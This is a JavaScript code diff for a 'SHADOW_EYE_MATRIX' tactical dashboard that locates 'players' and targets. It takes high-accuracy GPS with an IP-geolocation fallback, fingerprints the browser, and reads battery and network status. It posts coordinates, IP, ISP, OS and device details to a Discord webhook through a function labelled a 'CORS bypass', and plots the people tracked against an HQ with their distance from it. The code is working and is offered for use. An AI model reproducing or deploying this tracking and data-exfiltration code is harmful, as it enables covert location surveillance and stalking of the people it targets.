+      try { mapInstance.invalidateSize(); } catch (_) {}
+    }, 300);
+  } catch (err) {
+    appendLog(`[MAP] Init failed: ${err.message}`, LOG.red);
+  }
+}
+
+function destroyMap() {
+  if (mapInstance) {
+    try { mapInstance.remove(); } catch (_) {}
+    mapInstance = null;
+    mapMarkers = { hq: null, admin: null, players: {} };
+    mapReady = false;
+  }
+}
+
+function panMapTo(lat, lng, zoom) {
+  if (!mapInstance || lat == null || lng == null) return;
+  try {
+    mapInstance.flyTo([lat, lng], zoom || mapInstance.getZoom(), { duration: 0.8 });
+    updateMapCoordsDisplay(lat, lng);
+  } catch (_) {}
+}
+
+function updateMapCoordsDisplay(lat, lng, label) {
+  if (!mapCoordsDisplay) return;
+  const prefix = label ? `${label}: ` : '';
+  mapCoordsDisplay.textContent = lat != null ? `${prefix}${lat.toFixed(5)}, ${lng.toFixed(5)}` : '—';
+}
+
+function updateMapMarker(type, id, lat, lng, popupHtml) {
+  if (!mapInstance || typeof L === 'undefined' || lat == null || lng == null) return;
+
+  try {
+    if (type === 'admin') {
+      if (mapMarkers.admin) mapMarkers.admin.setLatLng([lat, lng]);
+      else mapMarkers.admin = L.marker([lat, lng], { icon: createIcon('marker-admin') }).addTo(mapInstance);
+      mapMarkers.admin.bindPopup(popupHtml || '<b>Admin</b>');
+    } else if (type === 'player') {
+      const cls = selectedTarget === id ? 'marker-player active' : 'marker-player';
+      if (mapMarkers.players[id]) {
+        mapMarkers.players[id].setLatLng([lat, lng]);
+        mapMarkers.players[id].setIcon(createIcon(cls));
+      } else {
+        mapMarkers.players[id] = L.marker([lat, lng], { icon: createIcon(cls) }).addTo(mapInstance);
+      }
+      // Add click event to open Google Maps
+      mapMarkers.players[id].on('click', () => {
+        const p = getPlayer(id);
+        if (p?.coords) {
+          window.open(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, '_blank');
+        }
+      });
+      mapMarkers.players[id].bindPopup(popupHtml || `<b>${id}</b><br><a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
+    }
+  } catch (_) {}
+}
+
+// ===== GEOLOCATION =====
+function requestGPS() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      reject(new Error('Geolocation not supported'));
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve({
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+      }),
+      (err) => reject(err),
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+}
+
+async function fetchIPGeo() {
+  const res = await fetch('https://ipapi.co/json/');
+  if (!res.ok) throw new Error(`IP API ${res.status}`);
+  return res.json();
+}
+
+function mapsLink(lat, lng) {
+  return lat != null ? `https://www.google.com/maps?q=${lat},${lng}` : null;
+}
+
+async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
+  if (isProcessing) {
+    appendLog('ระบบกำลังประมวลผล...', LOG.orange);
+    printCommandGuide();
+    return;
+  }
+
+  isProcessing = true;
+  setHeaderStatus('Processing...', 'orange');
+  if (infoGps) { infoGps.textContent = 'Processing...'; infoGps.className = 'text-orange-400'; }
+  if (infoLastAction) infoLastAction.textContent = actorLabel;
+
+  appendLog(`[${actorLabel}] Hybrid Geolocation start...`, LOG.orange);
+  appendLog('กำลังขอสิทธิ์ GPS...', LOG.white);
+
+  const fp = getFingerprint();
+  const result = {
+    actor: actorLabel,
+    permission: null, source: null, coords: null, ipData: null,
+    fingerprint: fp, distanceKm: null,
+    timestamp: new Date().toISOString(),
+    mapsLink: null,
+  };
+
+  try {
+    const gps = await requestGPS();
+    result.permission = 'Granted';
+    result.source = 'GPS';
+    result.coords = gps;
+    result.mapsLink = mapsLink(gps.latitude, gps.longitude);
+
+    appendLog(`[${actorLabel}] GPS Granted`, LOG.green);
+    appendLog(`พิกัด: ${gps.latitude.toFixed(6)}, ${gps.longitude.toFixed(6)}`, LOG.white);
+    appendLog(`ความแม่นยำ: ±${Math.round(gps.accuracy)}m`, LOG.orange);
+    if (infoGps) { infoGps.textContent = 'Granted'; infoGps.className = 'text-green-400'; }
+  } catch (err) {
+    result.permission = 'Denied';
+    result.source = 'IP Geolocation';
+    appendLog(`[${actorLabel}] GPS Denied — IP Fallback`, LOG.red);
+    appendLog(`Reason: ${err.message || 'denied'}`, LOG.red);
+
+    try {
+      const ip = await fetchIPGeo();
+      result.ipData = ip;
+      result.coords = { latitude: ip.latitude, longitude: ip.longitude };
+      result.mapsLink = mapsLink(ip.latitude, ip.longitude);
+      appendLog(`IP: ${ip.ip || '—'} | ${ip.city || '—'}, ${ip.region || '—'}`, LOG.white);
+      appendLog(`ISP: ${ip.org || '—'}`, LOG.orange);
+    } catch (ipErr) {
+      appendLog(`IP Geo failed: ${ipErr.message}`, LOG.red);
+    }
+
+    appendLog(`OS: ${fp.os} | Browser: ${fp.browser} | TZ: ${fp.timezone}`, LOG.orange);
+    if (infoGps) { infoGps.textContent = 'Denied (IP)'; infoGps.className = 'text-red-400'; }
+  }
+
+  if (result.coords?.latitude != null) {
+    result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
+    appendLog(`[DISTANCE]: Target is ${result.distanceKm.toFixed(2)} km away from Center.`, LOG.white);
+
+    panMapTo(result.coords.latitude, result.coords.longitude, 14);
+
+    if (playerId) {
+      const p = getPlayer(playerId);
+      if (p) {
+        p.coords = { latitude: result.coords.latitude, longitude: result.coords.longitude };
+        p.lastUpdate = result.timestamp;
+        p.permission = result.permission;
+        p.source = result.source;
+        p.distanceKm = result.distanceKm;
+        
+        p.ip = result.ipData?.ip || null;
+        p.isp = result.ipData?.org || null;
+        p.os = fp.os;
+        p.screen = fp.screen;
+        
+        if (typeof navigator.getBattery === 'function') {
+          try {
+            const battery = await navigator.getBattery();
+            p.battery = Math.round((battery.level || 0) * 100);
+            p.charging = battery.charging;
+          } catch (_) {}
+        }
+        
+        try {
+          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+          if (conn) {
+            p.network = conn.effectiveType || conn.type || 'Unknown';
+          }
+        } catch (_) {}
+        
+        savePlayers();
+        renderPlayerList();
+        updateMapMarker('player', playerId, result.coords.latitude, result.coords.longitude,
+            `<b>${esc(p.name)}</b><br>${result.coords.latitude.toFixed(5)}, ${result.coords.longitude.toFixed(5)}<br>${result.distanceKm.toFixed(2)} km from HQ<br><a href="https://www.google.com/maps?q=${result.coords.latitude},${result.coords.longitude}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
+        updateMapCoordsDisplay(result.coords.latitude, result.coords.longitude, p.name);
+      }
+    } else {
+      updateMapMarker('admin', null, result.coords.latitude, result.coords.longitude,
+        `<b>Admin</b><br>${result.coords.latitude.toFixed(5)}, ${result.coords.longitude.toFixed(5)}<br>${result.distanceKm.toFixed(2)} km from HQ`);
+      updateMapCoordsDisplay(result.coords.latitude, result.coords.longitude, 'Admin');
+      lastGpsResult = result;
+    }
+  }
+
+  appendLog('Sending to Discord...', LOG.orange);
+  await sendToDiscord(result);
+  appendLog('Complete.', LOG.green);
+
+  setHeaderStatus('Ready', 'white');
+  isProcessing = false;
+  printCommandGuide();
+}
+
+// ===== DISCORD (multi-strategy CORS bypass) =====
+function postDiscord(payload) {
+  if (!DISCORD_WEBHOOK_URL) return Promise.resolve(false);
+  const body = JSON.stringify(payload);
+
+  try {
+    if (typeof navigator.sendBeacon === 'function') {
+      const blob = new Blob([body], { type: 'application/json' });
+      if (navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob)) return Promise.resolve(true);
+    }
+  } catch (_) {}
+
+  return fetch(DISCORD_WEBHOOK_URL, {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'text/plain' },
+    body,
+  }).then(() => true).catch(() => false);
+}
+
+async function sendDiscordAlert(title, desc, color) {
+  const ok = await postDiscord({
+    embeds: [{ title, description: desc, color, footer: { text: 'SHADOW_EYE_MATRIX — Alert' }, timestamp: new Date().toISOString() }],
+  });
+  if (!ok) appendLog('Discord alert dispatch failed', LOG.red);
+}
+
+async function sendToDiscord(data) {
+  if (!DISCORD_WEBHOOK_URL) {
+    appendLog('Discord URL not configured', LOG.red);
+    return;
+  }
+
+  const granted = data.permission === 'Granted';
+  const fp = data.fingerprint || {};
+  const fields = [
+    { name: '🎭 Actor', value: data.actor || 'Admin', inline: false },
+    { name: '🔐 Permission', value: granted ? '✅ Granted (GPS)' : '❌ Denied (IP Geo)', inline: true },
+    { name: '📡 Source', value: data.source || '—', inline: true },
+  ];
+
+  if (data.coords) {
+    fields.push({ name: '📍 Coordinates', value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false });
+    if (data.coords.accuracy != null) fields.push({ name: '🎯 Accuracy', value: `±${Math.round(data.coords.accuracy)}m`, inline: true });
+  }
+  if (data.distanceKm != null) {
+    fields.push({ name: '📏 Distance from HQ', value: `${data.distanceKm.toFixed(2)} km (Chumphon ${BASE_LAT}, ${BASE_LNG})`, inline: false });
+  }
+  if (data.ipData) {
+    fields.push(
+      { name: '🌍 Country', value: `${data.ipData.country_name || '—'}`, inline: true },
+      { name: '🏙 City', value: `${data.ipData.region || '—'}, ${data.ipData.city || '—'}`, inline: true },
+      { name: '🌐 ISP', value: data.ipData.org || '—', inline: false },
+      { name: '🔢 IP', value: data.ipData.ip || '—', inline: true },
+    );
+  }
+
+  fields.push(
+    { name: '💻 OS', value: fp.os || '—', inline: true },
+    { name: '🌐 Browser', value: fp.browser || '—', inline: true },
+    { name: '🗣 Language', value: fp.language || '—', inline: true },
+    { name: '🕰 Timezone', value: fp.timezone || '—', inline: true },
+    { name: '📱 Screen', value: fp.screen || '—', inline: true },
+    { name: '🔍 DPR', value: String(fp.devicePixelRatio ?? '—'), inline: true },
+    { name: '🖥 Effective Res', value: fp.effectiveResolution || '—', inline: true },
+    { name: '👤 Session', value: sessionUser || '—', inline: true },
+  );
+
+  if (data.mapsLink) fields.push({ name: '🗺 Google Maps', value: `[Open Map](${data.mapsLink})`, inline: false });
+
+  const ok = await postDiscord({
+    embeds: [{
+      title: '🛰 SHADOW_EYE_MATRIX — Location Report',
+      description: granted ? `${data.actor}: GPS Granted` : `${data.actor}: GPS Denied — IP + Fingerprint`,
+      color: granted ? 0x22c55e : 0xef4444,
+      fields,
+      footer: { text: 'SHADOW_EYE_MATRIX Tactical Dashboard' },
+      timestamp: data.timestamp,
+    }],
+  });
+
+  appendLog(ok ? 'Discord payload dispatched ✓' : 'Discord dispatch failed ✗', ok ? LOG.green : LOG.red);
+}
+
+// ===== SAFE API HELPERS (mobile crash prevention) =====
+async function safeBatteryCheck() {
+  if (typeof navigator.getBattery !== 'function') {
+    appendLog('Battery API not supported on this device', LOG.red);
+    return;
+  }
+  appendLog('Checking battery...', LOG.orange);
+  try {
+    const b = await navigator.getBattery();
+    if (!b) { appendLog('Battery data unavailable', LOG.red); return; }
+    const pct = Math.round((b.level || 0) * 100);
+    appendLog(`Battery: ${pct}%`, pct > 20 ? LOG.white : LOG.red);
+    appendLog(`Charging: ${b.charging ? 'Yes' : 'No'}`, b.charging ? LOG.green : LOG.orange);
+    if (b.charging && b.chargingTime !== Infinity) appendLog(`Time to full: ~${Math.round(b.chargingTime / 60)} min`, LOG.orange);
+    if (!b.charging && b.dischargingTime !== Infinity) appendLog(`Time remaining: ~${Math.round(b.dischargingTime / 60)} min`, LOG.orange);
+  } catch (err) {
+    appendLog(`Battery check error: ${err.message || 'unknown'}`, LOG.red);
+  }
+}
+
+function safeNetworkCheck() {
+  appendLog('═══ Network Status ═══', LOG.green);
+  const online = typeof navigator.onLine === 'boolean' ? navigator.onLine : true;
+  appendLog(`Connection: ${online ? 'Online' : 'Offline'}`, online ? LOG.green : LOG.red);
+
+  try {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+      appendLog(`Type: ${conn.effectiveType || conn.type || '—'}`, LOG.white);
+      if (conn.downlink != null) appendLog(`Downlink: ${conn.downlink} Mbps`, LOG.orange);
+      if (conn.rtt != null) appendLog(`RTT: ${conn.rtt} ms`, LOG.orange);
+      if (conn.saveData != null) appendLog(`Save-Data: ${conn.saveData ? 'On' : 'Off'}`, LOG.white);
+    } else {
+      appendLog('Network Info API unavailable — using online/offline only', LOG.orange);
+    }
+  } catch (err) {
+    appendLog(`Network check error: ${err.message || 'unknown'}`, LOG.red);
+  }
+}
+
+// ===== COMMANDS =====
+const COMMANDS = {
+  '/help': () => {
+    appendLog('Available commands:', LOG.green);
+    appendLog('  /gps      — Admin GPS scan (Hybrid + distance)', LOG.white);
+    appendLog('  /status   — Device status, fingerprint, screen', LOG.white);
+    appendLog('  /battery  — Battery level (if supported)', LOG.white);
+    appendLog('  /network  — Network connection status', LOG.white);
+    appendLog('  /clear    — Clear console', LOG.white);
+    appendLog('  /logout   — Logout & clear session', LOG.white);
+    appendLog('  /help     — Show all commands', LOG.white);
+  },
+  '/gps': async () => { await runHybridGeolocation('Admin'); return 'skip'; },
+  '/status': () => {
+    const fp = getFingerprint();
+    const sa = captureScreenAnalytics();
+    appendLog('═══ System Status ═══', LOG.green);
+    appendLog(`Session: ${sessionUser || '—'} | Actor: ${selectedTarget === 'admin' ? 'Admin' : getPlayer(selectedTarget)?.name || selectedTarget}`, LOG.white);
+    appendLog(`Network: ${fp.online ? 'Online' : 'Offline'}`, fp.online ? LOG.green : LOG.red);
+    appendLog('── Screen Analytics ──', LOG.orange);
+    appendLog(`Resolution: ${sa.resolution} | DPR: ${sa.devicePixelRatio}`, LOG.white);
+    appendLog(`Effective: ${sa.effectiveResolution} | ${sa.orientation}`, LOG.orange);
+    appendLog('── Fingerprint ──', LOG.orange);
+    appendLog(`OS: ${fp.os} | Browser: ${fp.browser}`, LOG.white);
+    appendLog(`Lang: ${fp.language} | TZ: ${fp.timezone}`, LOG.white);
+    if (lastGpsResult) {
+      appendLog('── Last Admin GPS ──', LOG.orange);
+      appendLog(`Status: ${lastGpsResult.permission} (${lastGpsResult.source})`, lastGpsResult.permission === 'Granted' ? LOG.green : LOG.red);
+      if (lastGpsResult.distanceKm != null) appendLog(`[DISTANCE]: ${lastGpsResult.distanceKm.toFixed(2)} km from Center`, LOG.white);
+    }
+    players.forEach((p) => {
+      if (p.coords) appendLog(`[${p.name}]: ${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)} (${p.distanceKm?.toFixed(2) || '?'} km)`, LOG.orange);
+    });
+  },
+  '/battery': async () => { await safeBatteryCheck(); },
+  '/network': () => { safeNetworkCheck(); },
+  '/clear': () => { clearConsole(); appendLog('Console cleared.', LOG.green); },
+  '/logout': () => { showLogin(); return 'skip'; },
+};
+
+async function handleCommand(raw) {
+  const cmd = raw.trim().toLowerCase();
+  if (!cmd) return;
+  appendLog(`> ${raw.trim()}`, LOG.green);
+
+  const fn = COMMANDS[cmd];
+  if (!fn) {
+    appendLog(`Unknown: "${cmd}" — type /help`, LOG.red);
+    printCommandGuide();
+    return;
+  }
+
+  if (infoLastAction) infoLastAction.textContent = cmd;
+  const r = await fn();
+  if (r !== 'skip') printCommandGuide();
+}
+
+// ===== UI =====
+function setHeaderStatus(text, color) {
+  if (!headerStatus) return;
+  headerStatus.textContent = text;
+  const cls = { green: 'text-green-400', red: 'text-red-400', orange: 'text-orange-400', white: 'text-white' };
+  headerStatus.className = `text-[10px] sm:text-xs ${cls[color] || cls.white}`;
+}
+
+function showAppSelector() {
+  if (loginScreen) loginScreen.classList.add('hidden');
+  if (appSelector) appSelector.classList.remove('hidden');
+}
+
+function showDashboard(user, restore = false) {
+  sessionUser = user;
+  saveSession(user);
+  captureScreenAnalytics();
+  loadPlayers();
+  initMonitors();
+
+  if (appSelector) appSelector.classList.add('hidden');
+  if (dashboard) dashboard.classList.remove('hidden');
+  if (infoSession) infoSession.textContent = user;
+  if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
+  setHeaderStatus(typeof navigator.onLine === 'boolean' && navigator.onLine ? 'Ready' : 'Offline',
+    navigator.onLine ? 'white' : 'red');
+
+  clearConsole();
+  appendLog('═══════════════════════════════════════════', LOG.dim);
+  appendLog('SHADOW_EYE_MATRIX — Integrated Tactical Mode', LOG.green);
+  appendLog('═══════════════════════════════════════════', LOG.dim);
+  appendLog(restore ? `Session restored — Welcome back, ${user}` : `Authenticated — Welcome, ${user}`, LOG.green);
+
+  const sa = screenAnalytics;
+  appendLog(`Screen: ${sa.resolution} @ ${sa.devicePixelRatio}x DPR (${sa.orientation})`, LOG.orange);
+
+  renderPlayerList();
+  printCommandGuide();
+
+  setTimeout(() => {
+    initMap();
+    try { mapInstance?.invalidateSize(); } catch (_) {}
+  }, 200);
+
+  if (commandInput) commandInput.focus();
+}
+
+function showLogin() {
+  sessionUser = null;
+  lastGpsResult = null;
+  selectedTarget = 'admin';
+  clearSession();
+  teardownMonitors();
+  stopAllTracking();
+
+  destroyMap();
+
+  if (dashboard) dashboard.classList.add('hidden');
+  if (appSelector) appSelector.classList.add('hidden');
+  if (loginScreen) loginScreen.classList.remove('hidden');
+  if (loginForm) loginForm.reset();
+  if (loginError) loginError.classList.add('hidden');
+}
+
+// ===== EVENT BINDING =====
+function bindEvents() {
+  loginForm?.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const u = $('username')?.value?.trim();
+    const p = $('password')?.value;
+    if (u === AUTH.username && p === AUTH.password) {
+      showAppSelector();
+    } else if (loginError) {
+      loginError.textContent = 'Invalid credentials — Permission Denied';
+      loginError.classList.remove('hidden');
+    }
+  });
+
+  logoutBtn?.addEventListener('click', showLogin);
+
+  gpsIconBtn?.addEventListener('click', () => {
+    selectedTarget = 'admin';
+    if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
+    appendLog('[GPS Icon] Admin GPS scan initiated', LOG.orange);
+    runHybridGeolocation('Admin');
+  });
+
+  addPlayerBtn?.addEventListener('click', addPlayer);
+
+  commandForm?.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const v = commandInput?.value || '';
+    if (commandInput) commandInput.value = '';
+    handleCommand(v);
+  });
+
+  // App Selector - GPS Tool button
+  gpsToolBtn?.addEventListener('click', () => {
+    showDashboard(AUTH.username);
+  });
+
+  // Right Drawer events
+  drawerClose?.addEventListener('click', closeRightDrawer);
+  drawerSaveNotes?.addEventListener('click', savePlayerNotes);
+
+  window.addEventListener('resize', () => {
+    try { mapInstance?.invalidateSize(); } catch (_) {}
+  });
+}
+
+// ===== BOOT =====
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', safeInit);
+} else {
+  safeInit();
+}
